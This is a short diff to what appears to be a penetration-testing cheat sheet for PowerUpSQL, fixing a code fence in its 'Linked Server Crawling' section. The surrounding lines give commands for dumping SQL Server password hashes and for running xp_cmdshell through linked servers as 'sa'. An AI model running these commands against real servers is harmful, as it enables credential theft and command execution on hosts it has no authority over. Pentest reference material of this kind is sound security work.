@@ -15,7 +15,7 @@ Get-SQLServerPasswordHash -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Migrate
 ```
 
 ### Linked Server Crawling
-``
+```
 Get-SQLServerLinkCrawl -verbose -instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456'
 Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
 Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
